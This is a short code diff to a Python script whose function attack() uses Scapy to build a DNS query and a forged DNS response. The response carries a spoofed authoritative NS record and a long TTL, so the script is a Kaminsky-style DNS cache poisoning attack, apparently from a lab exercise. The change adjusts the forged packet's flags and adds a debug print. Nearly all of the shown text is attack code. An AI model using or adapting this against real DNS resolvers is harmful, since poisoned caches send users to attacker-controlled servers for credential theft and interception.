@@ -63,8 +63,8 @@ def attack():
     sock.bind((my_ip, my_port))
 
     dns_request = DNS(rd=1, qd=DNSQR(qname=base_domain))
-    fake_response = DNS(id=42, qr=1, rd=1, ra=1, qdcount=1, ancount=1, nscount=1, arcount=0, 
-		qd=DNSQR(qname=base_domain, qtype=1, qclass=1), 
+    fake_response = DNS(id=42, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, 
+		qd=DNSQR(qname=base_domain), 
 		an=DNSRR(rrname=base_domain, ttl=70000, rdata='1.2.3.4', rdlen=4),
 		ns=DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof)
 	)
@@ -75,6 +75,7 @@ def attack():
         dns_request[DNS].qd.qname = url
         fake_response[DNS].qd.qname = url
         fake_response[DNS].an.rrname = url
+        print fake_response.show()
 
         # send dns query
         sendPacket(sock, dns_request, my_ip, dns_port)
